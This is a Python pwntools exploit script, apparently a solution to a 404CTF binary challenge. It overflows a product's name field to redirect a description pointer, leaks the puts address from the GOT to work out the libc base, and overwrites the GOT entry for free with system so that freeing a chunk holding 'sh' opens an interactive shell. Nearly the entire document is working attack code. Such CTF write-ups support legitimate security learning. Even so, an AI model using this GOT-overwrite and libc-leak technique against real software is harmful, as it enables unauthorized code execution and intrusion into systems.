from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

gdbscript = """
b *main
continue
"""

if args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdbscript)
elif args.REMOTE:
    p = remote('localhost', 2222) # remote('challenges.404ctf.fr', 31338)
else:
    p = process(elf.path)
    
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'>> ', b'1337') # price
p.sendlineafter(b'>> ', b'A'*16) # name
p.sendlineafter(b'>> ', b'description') # description

p.sendlineafter(b'> ', b'5') # display
description_addr = p.recv().split(b'A'*16)[1][:4]
p.sendline(b'5')

puts_addr = p64(elf.got['puts'])
for i in range(15):
    p.sendlineafter(b'> ', b'3') # edit name
    p.sendlineafter(b'>> ', b'A'*(16+i)) # name

p.sendlineafter(b'> ', b'3') # edit_name
p.sendlineafter(b'>> ', b'A'*16 + puts_addr) # name

p.sendlineafter(b'> ', b'5') # display
puts_leak_addr = int.from_bytes(p.recv().split(b'Description : ')[1].split(b'\n')[0], byteorder='little')


log.success(f"Leaked puts address: {hex(puts_leak_addr)}")

libc.address = puts_leak_addr - libc.sym['puts']

# Get addresses for ret2libc
system_addr = libc.sym['system']            # Grab location of system
free_addr = p64(elf.got['free'])
binsh_addr  = next(libc.search(b'/bin/sh'))  # grab string location


log.success(f"Free address: {hex(int.from_bytes(free_addr, 'little'))}")

p.sendline(b'2') # edit price
p.sendlineafter(b'>> ',str(u32(b'sh\0\0')))

# set descriptoin point to got
p.sendline(b'3')  # edit name
p.sendafter(b'>> ', b'A' * 16 + p64(elf.got['free'])[:4])  # name

# write system into got
p.sendline(b'4')  # edit description
p.sendlineafter(b'>> ', p64(system_addr) + p64(libc.sym['puts']))

# call got@free -> systemm
p.sendline(b'6')

p.interactive()
